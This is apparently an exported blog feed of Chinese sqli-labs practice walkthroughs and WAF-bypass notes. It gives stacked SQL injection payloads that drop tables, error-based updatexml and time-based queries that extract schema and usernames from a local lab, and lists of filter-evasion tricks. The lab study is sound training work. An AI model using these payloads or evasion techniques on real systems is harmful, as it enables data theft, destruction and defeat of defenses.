<h5 id="这里先不管他显示的是正确还是错误，查看一下数据库，看一下表是否已经出入进去了，表已经成功插入进去了"><a href="#这里先不管他显示的是正确还是错误，查看一下数据库，看一下表是否已经出入进去了，表已经成功插入进去了" class="headerlink" title="这里先不管他显示的是正确还是错误，查看一下数据库，看一下表是否已经出入进去了，表已经成功插入进去了"></a>这里先不管他显示的是正确还是错误，查看一下数据库，看一下表是否已经出入进去了，表已经成功插入进去了</h5><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585060297003.png" alt="1585060297003"></p>
<h5 id="使用相同的命令删除crow表，点击login登录"><a href="#使用相同的命令删除crow表，点击login登录" class="headerlink" title="使用相同的命令删除crow表，点击login登录"></a>使用相同的命令删除crow表，点击login登录</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s&#39;; drop table crow ; #</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585060392441.png" alt="1585060392441"></p>
<h5 id="页面依然显示报错，查看一下数据库是否已经删除表了"><a href="#页面依然显示报错，查看一下数据库是否已经删除表了" class="headerlink" title="页面依然显示报错，查看一下数据库是否已经删除表了"></a>页面依然显示报错，查看一下数据库是否已经删除表了</h5><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585060451682.png" alt="1585060451682"></p>
<h5 id="成功将表删除，说明命令正确"><a href="#成功将表删除，说明命令正确" class="headerlink" title="成功将表删除，说明命令正确"></a>成功将表删除，说明命令正确</h5><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585060491422.png" alt="1585060491422"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第四十五关POST堆叠passwd</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%94%E5%85%B3POST%E5%A0%86%E5%8F%A0passwd/</url>
    <content><![CDATA[<p>查看原页面</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%94%E5%85%B3POST%E5%A0%86%E5%8F%A0passwd/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585107835468.png" alt="1585107835468"></p>
<p>查看源码，</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%94%E5%85%B3POST%E5%A0%86%E5%8F%A0passwd/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585107871307.png" alt="1585107871307"></p>
<p>与之前一样，单引号加括号闭合</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s&#39;); create table know like users;#</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%94%E5%85%B3POST%E5%A0%86%E5%8F%A0passwd/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585107955224.png" alt="1585107955224"></p>
<p>查看数据库，发现成功插入数据库know</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%94%E5%85%B3POST%E5%A0%86%E5%8F%A0passwd/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585107996949.png" alt="1585107996949"></p>
<p>删除数据库know</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s&#39;); drop table know;#</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%94%E5%85%B3POST%E5%A0%86%E5%8F%A0passwd/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585108099551.png" alt="1585108099551"></p>
<p>查看数据库是否已经删除</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%94%E5%85%B3POST%E5%A0%86%E5%8F%A0passwd/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585108133985.png" alt="1585108133985"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第四十六关SORT报错和时间</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AD%E5%85%B3SORT%E6%8A%A5%E9%94%99%E5%92%8C%E6%97%B6%E9%97%B4/</url>
    <content><![CDATA[<p>查看源码，红线处为有用信息。</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AD%E5%85%B3SORT%E6%8A%A5%E9%94%99%E5%92%8C%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585127678020.png" alt="1585127678020"></p>
<h5 id="第一个红线，在之前关卡中，并不是SORT而是ID这里改为了SORT所以网页中也不能用-id了也是要用-sort当sort-1的时候第一列排序，等于2的时候第二列排序，以此类推"><a href="#第一个红线，在之前关卡中，并不是SORT而是ID这里改为了SORT所以网页中也不能用-id了也是要用-sort当sort-1的时候第一列排序，等于2的时候第二列排序，以此类推" class="headerlink" title="第一个红线，在之前关卡中，并不是SORT而是ID这里改为了SORT所以网页中也不能用?id了也是要用?sort当sort=1的时候第一列排序，等于2的时候第二列排序，以此类推"></a>第一个红线，在之前关卡中，并不是SORT而是ID这里改为了SORT所以网页中也不能用?id了也是要用?sort当sort=1的时候第一列排序，等于2的时候第二列排序，以此类推</h5><p>这段代码的意思是：获取users所有的字段，然后order by进行排序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;SELECT * FROM users ORDER BY $id&quot;</span><br></pre></td></tr></table></figure>

<p>带入，2代表的意思是第二列，如果不加desc默认升序，从小到大排序，所以这里改变2 就可以拿到所有的信息，所以存在注入点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;SELECT * FROM users ORDER BY 2&quot;</span><br></pre></td></tr></table></figure>

<p>如果将sort改为4，如此也可以确定当前字段为3</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AD%E5%85%B3SORT%E6%8A%A5%E9%94%99%E5%92%8C%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585128932942.png" alt="1585128932942"></p>
<p>以字段2做演示，查看当前界面</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AD%E5%85%B3SORT%E6%8A%A5%E9%94%99%E5%92%8C%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585129201990.png" alt="1585129201990"></p>
<p>这里可以使用两种注入方法，第一种：报错注入。。   第二种： 时间注入</p>
<h5 id="使用报错注入，"><a href="#使用报错注入，" class="headerlink" title="使用报错注入，"></a>使用报错注入，</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-46&#x2F;?sort&#x3D;2 and updatexml(1,concat(0x7e,(database())),1)</span><br><span class="line">成功返回数据库</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AD%E5%85%B3SORT%E6%8A%A5%E9%94%99%E5%92%8C%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585129294262.png" alt="1585129294262"></p>
<h5 id="查看表名"><a href="#查看表名" class="headerlink" title="查看表名"></a>查看表名</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-46&#x2F;?sort&#x3D;2 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;security&#39;)),1)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AD%E5%85%B3SORT%E6%8A%A5%E9%94%99%E5%92%8C%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585129413792.png" alt="1585129413792"></p>
<h5 id="查看字段"><a href="#查看字段" class="headerlink" title="查看字段"></a>查看字段</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-46&#x2F;?sort&#x3D;2 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;)),1)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AD%E5%85%B3SORT%E6%8A%A5%E9%94%99%E5%92%8C%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585129762167.png" alt="1585129762167"></p>
<h5 id="查看数据"><a href="#查看数据" class="headerlink" title="查看数据"></a>查看数据</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里不能用limit 0,1 当前数据在起始位置已经知道了，</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-46&#x2F;?sort&#x3D;2 and updatexml(1,concat(0x7e,(select group_concat(username)from users limit 1,1)),1)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AD%E5%85%B3SORT%E6%8A%A5%E9%94%99%E5%92%8C%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585129998451.png" alt="1585129998451"></p>
<h5 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h5><h5 id="获取数据库长度，如果正确直接返回，如果错误执行sleep"><a href="#获取数据库长度，如果正确直接返回，如果错误执行sleep" class="headerlink" title="获取数据库长度，如果正确直接返回，如果错误执行sleep"></a>获取数据库长度，如果正确直接返回，如果错误执行sleep</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if((length(database())&gt;2),1,sleep(5))</span><br></pre></td></tr></table></figure>

<p>用法和以前相同</p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第四十关堆叠</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%B3%E5%A0%86%E5%8F%A0/</url>
    <content><![CDATA[<h4 id="查看初始界面，页面返回正常"><a href="#查看初始界面，页面返回正常" class="headerlink" title="查看初始界面，页面返回正常"></a>查看初始界面，页面返回正常</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%B3%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585052435003.png" alt="1585052435003"></p>
<h4 id="查看源代码，-id被单引号和括号包裹"><a href="#查看源代码，-id被单引号和括号包裹" class="headerlink" title="查看源代码，$id被单引号和括号包裹"></a>查看源代码，$id被单引号和括号包裹</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%B3%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585052476137.png" alt="1585052476137"></p>
<h4 id="加上单引号，括号和注释符查看是否返回正常，页面返回正常"><a href="#加上单引号，括号和注释符查看是否返回正常，页面返回正常" class="headerlink" title="加上单引号，括号和注释符查看是否返回正常，页面返回正常"></a>加上单引号，括号和注释符查看是否返回正常，页面返回正常</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%B3%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585052532957.png" alt="1585052532957"></p>
<h4 id="使用堆叠，向数据库插入表，页面返回正常"><a href="#使用堆叠，向数据库插入表，页面返回正常" class="headerlink" title="使用堆叠，向数据库插入表，页面返回正常"></a>使用堆叠，向数据库插入表，页面返回正常</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%B3%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585052613586.png" alt="1585052613586"></p>
<h4 id="查看数据库是否已经插入表crow，成功插入"><a href="#查看数据库是否已经插入表crow，成功插入" class="headerlink" title="查看数据库是否已经插入表crow，成功插入"></a>查看数据库是否已经插入表crow，成功插入</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%B3%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585052639791.png" alt="1585052639791"></p>
<h4 id="删除crow表，页面返回正常"><a href="#删除crow表，页面返回正常" class="headerlink" title="删除crow表，页面返回正常"></a>删除crow表，页面返回正常</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%B3%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585052674778.png" alt="1585052674778"></p>
<h4 id="查看是否已经删除crow表，成功删除"><a href="#查看是否已经删除crow表，成功删除" class="headerlink" title="查看是否已经删除crow表，成功删除"></a>查看是否已经删除crow表，成功删除</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%B3%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585052701293.png" alt="1585052701293"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第四十四关POST堆叠passwd处</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%85%B3POST%E5%A0%86%E5%8F%A0passwd%E5%A4%84/</url>
    <content><![CDATA[<p>查看初始界面</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%85%B3POST%E5%A0%86%E5%8F%A0passwd%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585102423639.png" alt="1585102423639"></p>
<p>查看源码</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%85%B3POST%E5%A0%86%E5%8F%A0passwd%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585102450465.png" alt="1585102450465"></p>
<p>和前两关是一样的，都在password处注入，这次闭合只是单引号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s&#39;; create table know like users;#</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%85%B3POST%E5%A0%86%E5%8F%A0passwd%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585102723259.png" alt="1585102723259"></p>
<p>页面返回错误，不管返回什么查看一下数据库</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%85%B3POST%E5%A0%86%E5%8F%A0passwd%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585102950544.png" alt="1585102950544"></p>
<p>成功地向数据库插入了表，</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%85%B3POST%E5%A0%86%E5%8F%A0passwd%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585102995366.png" alt="1585102995366"></p>
<p>删除know表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s&#39;; drop table know ;#</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%85%B3POST%E5%A0%86%E5%8F%A0passwd%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585103076908.png" alt="1585103076908"></p>
<p>查看数据库，成功删除know表</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%85%B3POST%E5%A0%86%E5%8F%A0passwd%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585103090951.png" alt="1585103090951"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sql注入WAF绕过</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sql%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h3 id="1、sql注释符绕过"><a href="#1、sql注释符绕过" class="headerlink" title="1、sql注释符绕过"></a>1、sql注释符绕过</h3><p>（1）union /**/select 我们将union select之间的空格使用指示符进行替换（适用于对union select之间的空格进行检测的情况）</p>
<p>（2）union/*dasdafaf */select 我们在注释符中间填充内容</p>
<p>（3）union/*aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa */select 构造较大数据</p>
<p>（4）/* union select */内联注释    我们使用内联注释，mysql特有！</p>
<h3 id="2、空白符绕过"><a href="#2、空白符绕过" class="headerlink" title="2、空白符绕过"></a>2、空白符绕过</h3><p>（1）mysql空白符：%09；%0A；%0B；%0D；%20；%0C；%A0；/*xxx */</p>
<p>（2）正则空白符：%09；%0A；%0B；%0D；%20；</p>
<p>%25就是百分号(%)  %25A0就是空白符</p>
<h3 id="3、函数分隔符号"><a href="#3、函数分隔符号" class="headerlink" title="3、函数分隔符号"></a>3、函数分隔符号</h3><p>将一个函数进行分割concat()</p>
<p>%25就是百分号(%)  %25A0就是空白符</p>
<p>concat%2520(</p>
<p>concat/**/(</p>
<p>concat%250c(</p>
<p>concat%25a0(</p>
<h3 id="4、浮点数法"><a href="#4、浮点数法" class="headerlink" title="4、浮点数法"></a>4、浮点数法</h3><p>WAF对于id=1可以进行检测，但是对于id=1E0、ID=1.0、ID=\N可能就无法检测</p>
<h3 id="5、利用error-based进行sql注入"><a href="#5、利用error-based进行sql注入" class="headerlink" title="5、利用error-based进行sql注入"></a>5、利用error-based进行sql注入</h3><p>extractvalue(1,comcat(0x5c,md5(3)));</p>
<p>updatexml(1,concat(0x5d,md5(3)),1);</p>
<p>GeometryCollection((select * from(select * from(select @@version)f)x))</p>
<p>polygon((select * from(select name const(version(),1))x))</p>
<p>linestring()</p>
<p>multipoint()</p>
<p>multilinestring()</p>
<p>multipolygon()</p>
<h3 id="6、mysql特殊语法"><a href="#6、mysql特殊语法" class="headerlink" title="6、mysql特殊语法"></a>6、mysql特殊语法</h3><p>select {x schema_name} from {x information_schema.schemata};</p>
<p>select {x 1};</p>
<h3 id="7、大小写绕过"><a href="#7、大小写绕过" class="headerlink" title="7、大小写绕过"></a>7、大小写绕过</h3><p>如果对关键字 and     or     union等进行过滤，可以考虑使用大小写混合的方法</p>
<p>例如：Or     aNd     UniOn</p>
<p>但是很多时候有函数会对部分大小写进行过滤，这时候可以考虑双写的方法</p>
<h3 id="8、关键字重复"><a href="#8、关键字重复" class="headerlink" title="8、关键字重复"></a>8、关键字重复</h3><p>OORr</p>
<h3 id="9、关键字替换"><a href="#9、关键字替换" class="headerlink" title="9、关键字替换"></a>9、关键字替换</h3><p>如果还是无法绕过，可以考虑替换的方法</p>
<p>and —&gt; &amp;&amp;       or —&gt;||       like可以替换=        &lt;&gt;等价于 !=</p>
<p>还有很多方法</p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/漏洞银行WAF绕过</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8CWAF%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h3 id="WAF绕过技巧"><a href="#WAF绕过技巧" class="headerlink" title="WAF绕过技巧"></a>WAF绕过技巧</h3><h4 id="基于黑名单，空格代替，转义"><a href="#基于黑名单，空格代替，转义" class="headerlink" title="基于黑名单，空格代替，转义"></a>基于黑名单，空格代替，转义</h4><h5 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h5><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8CWAF%E7%BB%95%E8%BF%87/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584807376652.png" alt="1584807376652"></p>
<h5 id="无空格的查询："><a href="#无空格的查询：" class="headerlink" title="无空格的查询："></a>无空格的查询：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?id&#x3D;1e0and&#123;&#96;&#96;select(left(database(),1))&#x3D;&#39;a&#39;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="特殊位置代替空格："><a href="#特殊位置代替空格：" class="headerlink" title="特殊位置代替空格："></a>特殊位置代替空格：</h5><ul>
<li>科学计数法(1e0,.,)</li>
<li>数学计算(+-*/)</li>
<li>特殊字符(\N)</li>
<li>注释符(/**/)</li>
</ul>
<h4 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8CWAF%E7%BB%95%E8%BF%87/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584839967269.png" alt="1584839967269"></p>
<h4 id="注释符-0a换行"><a href="#注释符-0a换行" class="headerlink" title="注释符+%0a换行"></a>注释符+%0a换行</h4><ul>
<li>大小写替换</li>
<li>/**/注释、%0b、+、||、分割关键字</li>
<li>内联注释绕过</li>
<li>%df宽字节绕过</li>
<li>溢出绕过</li>
<li>等等</li>
</ul>
<h4 id="基于HTTP协议的绕过方法"><a href="#基于HTTP协议的绕过方法" class="headerlink" title="基于HTTP协议的绕过方法"></a>基于HTTP协议的绕过方法</h4><h5 id="古老的HTTP-0-9协议"><a href="#古老的HTTP-0-9协议" class="headerlink" title="古老的HTTP 0.9协议"></a>古老的HTTP 0.9协议</h5><p>例如：GET <a href="http://127.0.0.1/Less-1/index.php" target="_blank" rel="noopener">http://127.0.0.1/Less-1/index.php</a>        其中并没有其他的user-agent，cookie什么的，只有一个GET请求，所以很多网站不认识，WAF直接放行    </p>
<h4 id="分块传输-Chunked-Transfer-Http-1-1"><a href="#分块传输-Chunked-Transfer-Http-1-1" class="headerlink" title="分块传输/Chunked Transfer(Http 1.1)"></a>分块传输/Chunked Transfer(Http 1.1)</h4><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8CWAF%E7%BB%95%E8%BF%87/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584843315502.png" alt="1584843315502"></p>
<h4 id="协议未覆盖绕过"><a href="#协议未覆盖绕过" class="headerlink" title="协议未覆盖绕过"></a>协议未覆盖绕过</h4><p>以下为四种常见的content-type类型，尝试互相替换尝试绕过WAF过滤机制</p>
<p>注：如图常见的绕过方式为使用 multipart/form-data 标签，并把name设为参数名内容写入注入语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">content-Type:	test&#x2F;html;	charset&#x3D;UTF-8</span><br><span class="line">content-Type:	application&#x2F;json;	charset&#x3D;UTF-8</span><br><span class="line">content-Type:	application&#x2F;x-www-form-urlencoded;charset&#x3D;utf-8</span><br><span class="line">content-Type:	multipart&#x2F;form-data; boundary&#x3D;something</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
</search>
